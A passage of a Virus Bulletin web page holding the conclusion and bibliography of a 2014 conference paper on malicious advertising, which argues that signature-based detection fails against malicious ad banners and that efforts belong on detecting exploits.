banners.</b></p></div><p>Although <span class="emphasis"><em>VirusTotal</em></span> does not cover the proactive modules of anti-virus engines, the signature-based approach clearly fails here. </p><p>A viable solution could be to block the ads at endpoints. Tools such as AdBlock allow users to do this. However, this would damage a huge sector of the web economy. It appears that at the current time, we need to focus our efforts on the detection and blocking of actual exploits. This, however, does not change the fact that legacy approaches for malware detection cannot cope with the ever-growing threat landscape. </p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3996136"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] DoubleClick. <span class="bibliosource"><a href="https://www.google.com/doubleclick/" target="_blank">http://www.google.com/doubleclick/</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] Provos, N.; McNamee, D.; Mavrommatis, P.; Wang, K.; Modadugu, N. The ghost in the browser: analysis of web-based malware. Proceedings of HotBots&rsquo;07, 2007. <span class="bibliosource"><a href="https://www.usenix.org/legacy/event/hotbots07/tech/full_papers/provos/provos.pdf" target="_blank">https://www.usenix.org/legacy/event/hotbots07/tech/full_papers/provos/provos.pdf</a></span>.</p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] Ford, S. Analyzing and Detecting Malicious Flash Advertisements. Proceedings of ACSAC&rsquo;09, 2009, pp.263&ndash;372. <span class="bibliosource"><a href="https://www.cs.ucsb.edu/~chris/research/doc/acsac09_flash.pdf" target="_blank">http://www.cs.ucsb.edu/~chris/research/doc/acsac09_flash.pdf</a></span>.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] Angelia; Pishva, D. Online advertising and its security and privacy concerns. Proceedings of ICACT&rsquo;13, 2013, pp.372&ndash;377. <span class="bibliosource"><a href="http://infoscience.epfl.ch/record/184961/files/EPFL_TH5664.pdf" target="_blank">http://infoscience.epfl.ch/record/184961/files/EPFL_TH5664.pdf</a></span>.</p></div><div class="bibliomixed"><a id="citation.5"></a><p class="bibliomixed">[5] Adobe Flash runtimes/Statistics. <span class="bibliosource"><a href="https://www.adobe.com/products/flashruntimes/statistics.html" target="_blank">http://www.adobe.com/products/flashruntimes/statistics.html</a></span>. </p></div><div class="bibliomixed"><a id="citation.6"></a><p class="bibliomixed">[6] Navaraj, M. The Wild Wild Web: YouTube ads serving malware. <span class="bibliosource"><a href="http://labs.bromium.com/2014/02/21/the-wild-wild-web-youtube-ads-serving-malware/" target="_blank">http://labs.bromium.com/2014/02/21/the-wild-wild-web-youtube-ads-serving-malware/</a></span>.</p></div><div class="bibliomixed"><a id="citation.7"></a><p class="bibliomixed">[7] About Targeting Criteria &ndash; Doubleclick for Publishers Help. <span class="bibliosource"><a href="https://support.google.com/dfp_premium/answer/177383?hl=en" target="_blank">https://support.google.com/dfp_premium/answer/177383?hl=en</a></span>.</p></div><div class="bibliomixed"><a id="citation.8"></a><p class="bibliomixed">[8] Kotov, V.; Massacci, K. Anatomy of Exploit Kits.Proceedings of ESSoS&rsquo;13. <span class="bibliosource"><a href="http://securitylab.disi.unitn.it/lib/exe/fetch.php?media=kotov_massacci_anatomy_of_exploit_kits_wp.pdf" target="_blank">http://securitylab.disi.unitn.it/lib/exe/fetch.php?media=kotov_massacci_anatomy_of_exploit_kits_wp.pdf</a></span>.</p></div><div class="bibliomixed"><a id="citation.9"></a><p class="bibliomixed">[9] Kotov, V. Dissecting the newest IE10 0-day exploit (CVE-2014-0322). <span class="bibliosource"><a href="http://labs.bromium.com/2014/02/25/dissecting-the-newest-ie10-0-day-exploit-cve-2014-0322/" target="_blank">http://labs.bromium.com/2014/02/25/dissecting-the-newest-ie10-0-day-exploit-cve-2014-0322/</a></span>. </p></div><div class="bibliomixed"><a id="citation.10"></a><p class="bibliomixed">[10] Running in the wild, not for so long. <span class="bibliosource"><a href="http://blogs.technet.com/b/srd/archive/2013/07/10/running-in-the-wild-not-for-so-long.aspx" target="_blank">http://blogs.technet.com/b/srd/archive/2013/07/10/running-in-the-wild-not-for-so-long.aspx</a></span>. </p></div><div class="bibliomixed"><a id="citation.11"></a><p class="bibliomixed">[11] Tracking Macromedia Flash Movies. <span class="bibliosource"><a href="https://www.adobe.com/resources/richmedia/tracking/designers_guide/" target="_blank">http://www.adobe.com/resources/richmedia/tracking/designers_guide/</a></span>. </p></div><div class="bibliomixed"><a id="citation.12"></a><p class="bibliomixed">[12] Fscommand &ndash; Adobe Help Resource Center. <span class="bibliosource"><a href="http://help.adobe.com/en_US/AS2LCR/Flash_10.0/help.html?content=00000561.html" target="_blank">http://help.adobe.com/en_US/AS2LCR/Flash_10.0/help.html?content=00000561.html</a></span>. </p></div><div class="bibliomixed"><a id="citation.13"></a><p class="bibliomixed">[13] ExternalInterface &ndash; AS3. ActionScript 3.0 Reference for Adobe Flash Platform. <span class="bibliosource"><a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html" target="_blank">http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.14"></a><p class="bibliomixed">[14] Stanley, J. Hideimage. <span class="bibliosource"><a href="http://incoherency.co.uk/tools/hideimage.php" target="_blank">http://incoherency.co.uk/tools/hideimage.php</a></span>.</p></div><div class="bibliomixed"><a id="citation.15"></a><p class="bibliomixed">[15] Chapter 22. Working with bitmaps. Programming Adobe ActionScript 3.0, pp.474&ndash;484, 2009. <span class="bibliosource"><a href="http://help.adobe.com/en_US/ActionScript/3.0_ProgrammingAS3/flash_as3_programming.pdf" target="_blank">http://help.adobe.com/en_US/ActionScript/3.0_ProgrammingAS3/flash_as3_programming.pdf</a></span>. </p></div></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<p><a href="/uploads/pdf/conference/vb2014/VB2014-Kotov.pdf" target="_blank"><img class="ccm-image-block responsive" alt="" src="/uploads/images/buttons/pdf-download-button.jpg" onmouseover="this.src = '/uploads/images/buttons/pdf-download-button-hover.jpg'" onmouseout="this.src = '/uploads/images/buttons/pdf-download-button.jpg'" border="0" height="45" width="262"></a></p>
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=VB2014 paper: Optimized mal-ops. Hack the ad network like a boss&url=https://www.virusbulletin.com/virusbulletin/2014/11/paper-optimized-mal-ops-hack-ad-network-boss"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2014/11/paper-optimized-mal-ops-hack-ad-network-boss'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2014/11/paper-optimized-mal-ops-hack-ad-network-boss&title=VB2014 paper: Optimized mal-ops. Hack the ad network like a boss"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2014/11/paper-optimized-mal-ops-hack-ad-network-boss&t=VB2014 paper: Optimized mal-ops. Hack the ad network like a boss"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2014/11/paper-optimized-mal-ops-hack-ad-network-boss"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p>Â </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">Â©1989-2022 Virus Bulletin.Â Â Â Â Â Â Â Â <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>Â Â Â Â Â Â Â Â <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>Â Â Â Â Â Â Â Â <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>